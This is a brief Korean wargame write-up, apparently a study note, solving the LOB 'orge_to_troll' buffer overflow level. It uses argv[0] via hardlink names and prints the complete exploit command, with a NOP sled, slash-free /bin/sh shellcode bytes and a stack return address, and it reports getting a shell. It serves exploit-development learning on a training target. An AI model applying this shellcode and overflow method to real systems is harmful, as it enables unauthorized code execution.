#week2  
##lob  
###orge_to_troll  
troll.c를 보면 하아.... argv[2]도 이제 쓰지 마란다.  
이거 보면서 아 이래서 전에 argv[0] 쓰게 했구나 했다.  
이제 troll을 sroll로 cp해준 후 srll을 ln 명령어(이름을 하나 더 붙여준다)로 "A"*135로 만들어준다.  
저 이름으로 gdb를 돌려준 다음 disas main을 한다.  
strcpy 호출 후인 main+245에 브레이크를 걸어주고   
r $(python -c 'print("\xbf"*48)')을 돌려준다.  
이를 통해 argv[0] 주소를 획득한다.    
이제 "\x90"*100으로 100칸, /을 제외한 쉘 코드 35칸(argv[0]은 /을 경로로 파악가능하기에 /을 제외한 쉘 코드를 사용해준다고 함)으로 
ln 명령어를 통해 이름을 바꿔준다.  
이러고 나서 아래와 같은 명령어를 통해 bash를 볼 수 있었다.  
 ./$(python -c 'print("\x90"*100+"\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+" "+"\x90"*44+"\x75\xfb\xff\xbf")')
풀다풀다 안 되어서 다른 분의 writeup을 정독했더니 argv앞에 경로이름이 붙기에 35의 값을 붙여서 넣어라길래 말 잘 들었더니 bash를 볼 수 있었다.   
